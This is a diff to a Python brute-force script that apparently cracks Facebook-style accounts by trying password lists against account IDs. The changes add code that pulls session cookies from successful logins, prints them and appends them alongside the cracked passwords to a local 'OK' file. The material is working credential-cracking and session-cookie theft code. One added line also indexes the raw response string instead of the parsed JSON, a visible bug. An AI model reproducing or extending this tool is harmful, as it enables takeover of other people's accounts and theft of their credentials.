@@ -39,7 +39,7 @@ logo = """
 /_/   \_\_| |_|_|  |_|\__,_|\__,_|
 
 [*]----------------------------------------------
-[*] Author        : MR.AhMad
+[*] Author        : .AhMad MasTan
 [*] Github        : https://github.com/Badakhshi-Jan/AhMad.git
 [*] Status        : free
 [*] version       : 0.1
@@ -274,16 +274,21 @@ def rndm(ids,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
+                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                                        coki = "sb="+sb+";"+cookie+""
                                         try:
                                                 okk=open('/sdcard/AhMad-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
                                                         print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;90m')
-                                                        open('/sdcard/AhMad-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[0;95m [🍪] %s   '%(coki))
+                                                        open('/sdcard/Ahmad-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AhMad-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;32m [Ahmad-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[0;95m [🍪] %s   '%(coki))
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
@@ -380,12 +385,16 @@ def rndm2(ids,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
+                                        cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                                        sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                                        coki = "sb="+sb+";"+cookie+""
                                         try:
                                                 okk=open('/sdcard/AhMad-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
                                                         print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;90m')
-                                                        open('/sdcard/AhMad-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[0;95m [🍪] %s   '%(coki))
+                                                        open('/sdcard/Ahmad-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
